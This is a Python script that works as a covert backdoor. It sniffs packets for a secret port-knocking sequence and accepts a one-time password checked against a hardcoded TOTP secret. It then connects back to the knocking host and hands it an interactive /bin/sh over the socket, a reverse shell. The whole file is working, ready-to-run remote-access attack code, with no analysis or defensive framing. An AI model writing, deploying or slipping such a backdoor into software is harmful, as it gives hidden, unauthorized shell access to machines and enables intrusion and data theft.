from pypacker import psocket
from pypacker.layer12 import ethernet
from pypacker.layer4 import tcp
from time import time
import pyotp 
import socket 
import subprocess
import os


def port_knocking(ports, timeout):
  """Monitor connections on pre-configured ports. This function ends if the Port Knocking is completed."""

  my_socket = psocket.SocketHndl(iface_name=None, timeout=60)
  port_count = current_time = 0

  while (port_count < len(ports)):
    bts = my_socket.recv()                # receveing bytes
    pkt = ethernet.Ethernet(bts)          # getting the packet

    if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[port_count]):
      if ((port_count != 0) and (time() - current_time > timeout)):   
        port_count = current_time = 0     # if the timeout is reached, restart
      else:
        port_count += 1
        current_time = time()


def check_OTP(port_otp):
  """Open specific port to receive OTP password."""

  otp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  otp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
  otp_socket.bind(('127.0.0.1', port_otp)) 
  otp_socket.listen(1) 
  con, client = otp_socket.accept() 
  client_value = con.recv(1024).decode().strip()
  otp_socket.close() 

  totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')
  if (totp.verify(client_value)):
    print("[+] A shell will be sent to your listening port!")
    return client[0]
  else:
    print("[-] Wrong one-time password!")


def reverse_shell(client_ip, port_reverse_shell):
  """Send shell after successful port knocking and otp."""

  shell_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  shell_socket.connect((client_ip, port_reverse_shell))
  os.dup2(shell_socket.fileno(),0)
  os.dup2(shell_socket.fileno(),1) 
  os.dup2(shell_socket.fileno(),2)
  subprocess.call(["/bin/sh","-i"])


if __name__ == '__main__':
  input_config = 1
  while input_config:
    try:
      ports_list = [int(x) for x in input("Type ports sequence (e.g. 12345 1337 5000): ").split()]
      timeout = int(input("Timeout (in seconds) between each port connection: "))
      port_otp = int(input("Type the port that will receive the OTP value: "))
      port_reverse_shell = int(input("Type the port that will receive the reverse shell: "))
      input_config = 0
    except ValueError:
      print ("\nERROR! Incorrect value type!")

  port_knocking(ports_list, timeout)
  client_ip = check_OTP(port_otp)
  reverse_shell(client_ip, port_reverse_shell)
